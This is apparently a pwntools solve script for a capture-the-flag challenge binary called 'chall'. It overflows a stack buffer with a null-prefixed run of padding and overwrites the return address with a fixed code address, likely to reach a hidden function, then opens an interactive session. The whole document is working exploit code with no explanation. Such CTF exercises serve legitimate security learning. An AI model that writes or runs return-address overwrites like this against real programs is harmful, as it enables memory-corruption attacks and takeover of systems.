from pwn import *
from struct import pack

exe = context.binary = ELF("./chall", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "WARNING"

def gdebug(exe: process):
    command = """
    break *main+129
    continue
    """
    attach(exe, gdbscript=command)

p = process()
# gdebug(p)
payload = b"A\x00"
payload += b"A"*((80-2)+8)
payload += pack("<Q", 0x4011de)
p.sendlineafter(b"Tell me about yourself\n", payload)
p.interactive()